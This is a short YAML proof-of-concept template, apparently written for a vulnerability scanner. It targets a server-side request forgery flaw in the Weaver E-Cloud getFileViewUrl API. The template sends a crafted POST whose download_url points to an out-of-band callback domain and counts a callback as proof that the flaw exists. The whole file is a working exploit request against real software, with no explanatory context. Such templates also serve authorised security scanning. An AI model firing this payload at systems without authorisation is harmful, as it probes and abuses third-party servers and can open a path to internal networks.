name: poc-yaml-weaverE-Cloud_getFileViewUrl-SSRF
transport: http


set:
  reverse: newReverse()
  reverseDomain: reverse.domain


rules:
  r0:
    request:
      method: POST
      path: /api/doc/mobile/fileview/getFileViewUrl
      headers:
        User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
        Content-Type: application/json
      body: '
        {
          "file_id": "1000",
          "file_name": "c",
          "download_url":"http://{{reverseDomain}}"
        }
       '
    expression: reverse.wait(1)
expression: r0()


detail:
  author: Superhero
  links:
